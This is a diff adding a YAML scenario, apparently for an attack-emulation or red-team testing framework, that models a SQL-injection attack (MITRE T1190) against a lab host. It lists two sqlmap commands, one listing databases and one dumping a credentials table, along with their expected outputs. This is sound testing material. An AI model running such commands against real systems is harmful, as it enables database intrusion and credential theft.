@@ -1,0 +1,16 @@
+id: scn-sqli-04
+name: Exploit Public-Facing Application (SQL Injection)
+description: Automated sqlmap probe extracting database schema and credentials via HTTP parameters.
+mitre_tactic: TA0001
+mitre_technique: T1190
+steps:
+  - step: 1
+    action: "sqlmap -u 'http://target-pod:8080/api/users?id=1' --batch --dbs"
+    tool: "sqlmap"
+    delay_ms: 1200
+    expected_output: "[*] Parameter 'id' is vulnerable (AND/OR time-based blind). Available databases: [3]: information_schema, app_db, users_vault"
+  - step: 2
+    action: "sqlmap -u 'http://target-pod:8080/api/users?id=1' --dump -D users_vault -T credentials"
+    tool: "sqlmap"
+    delay_ms: 1400
+    expected_output: "[+] Dumped 4 entries from table credentials: admin / $2a$12$e89... / active"
